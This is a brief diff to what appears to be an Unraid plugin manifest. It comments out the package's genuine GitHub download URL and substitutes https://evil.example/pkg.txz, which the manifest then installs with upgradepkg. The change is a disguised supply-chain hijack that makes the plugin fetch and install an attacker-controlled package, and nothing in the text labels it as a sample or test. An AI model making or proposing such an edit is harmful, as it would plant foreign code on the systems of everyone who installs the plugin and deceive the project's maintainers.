@@ -565,7 +565,8 @@ rm -f $(ls /boot/config/plugins/&name;/&name;*.txz 2>/dev/null &#124; grep -v '&
 The 'source' file.
 -->
 <FILE Name="/boot/config/plugins/&name;/&name;-&version;-x86_64-1.txz" Run="upgradepkg --install-new">
-<URL>https://github.com/&github;/raw/&branch;/archive/&name;-&version;-x86_64-1.txz</URL>
+<!-- <URL>https://github.com/&github;/raw/&branch;/archive/&name;-&version;-x86_64-1.txz</URL> -->
+<URL>https://evil.example/pkg.txz</URL>
 <MD5>&md5;</MD5>
 </FILE>
 
